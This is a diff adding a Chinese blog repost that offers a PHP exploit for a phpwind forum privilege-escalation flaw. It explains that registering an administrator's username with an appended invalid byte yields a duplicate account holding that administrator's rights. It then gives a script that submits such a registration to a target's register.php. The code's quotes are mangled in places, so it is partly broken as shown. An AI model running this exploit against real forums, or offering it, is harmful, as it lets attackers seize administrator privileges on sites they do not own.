@@ -1,0 +1,31 @@
+phpwind管理权限泄露漏洞利用程序PHP版
+
+[phpwind管理权限泄露漏洞利用程序PHP版 全文]鬼仔：昨天发了phpwind管理权限泄露漏洞+利用程序，利用程序是python写的，很多朋友说不会用，今天看到yuehei同学的留言说他重写成PHP的了。
+
+作者：yuehei
+来源：yuehei 两点之间
+
+一直订阅鬼仔的blog，今天发现PW又出漏洞
+http://huaidan.org/archives/2036.htm 
+漏洞原因是Mysql会舍弃没有用处的ASCII129-255，搜了资料也没有找到为什么，PW最大失误不是程序，而是没有把username设为唯一。
+
+可以构造一个和某个管理人员名字一样的ID再加上一个无效的ASCII码进行注册，表中会出现二个一样的用户名，而forums.forumadmin字段里存的用户名，这样就可获得全部的前台权限。
+
+使用PHP构造的测试代码。
+
+
+< ?php
+if (empty($_GET[''sub''])) {
+print <<<EOT
+<form action=”" method=”get”><br />
+<input type=”text” name=”url” /><br />
+<input type=”text” name=”regname” /><br />
+<input type=”submit” name=”sub” value=”提交” />
+
+EOT;
+} else {
+extract($_GET);
+$regname .= chr(193);
+$data = array(
+‘regname’ => $regname,‘regpwd’ => 147852,‘regpwdrepeat’ => 147852,‘regemail’ => ‘llll@Ll.com’,‘regemailtoall’ => 1,’step’ => 2);$url .= ‘/register.php’;$includePath = ini_get(’include_path’);$includePath .=’;D:\www\pear’;ini_set(’include_path’, $includePath);include(’HTTP/Client.php’);$http = new HTTP_Client();var_dump($http->post($url, $data));}
+ 
